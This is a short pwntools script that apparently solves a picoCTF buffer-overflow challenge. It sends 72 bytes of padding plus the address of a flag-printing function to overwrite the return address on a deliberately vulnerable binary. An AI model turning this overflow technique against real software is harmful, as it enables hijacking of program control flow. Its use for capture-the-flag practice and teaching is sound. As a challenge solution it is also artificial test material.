#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

#context.log_level = "debug"

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 56778)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    flagfun = 0x40123b
    payload = flat(b'A'*72, flagfun)
    io.sendlineafter(b'flag:', payload)

    io.interactive()

if __name__ == "__main__":
    main()
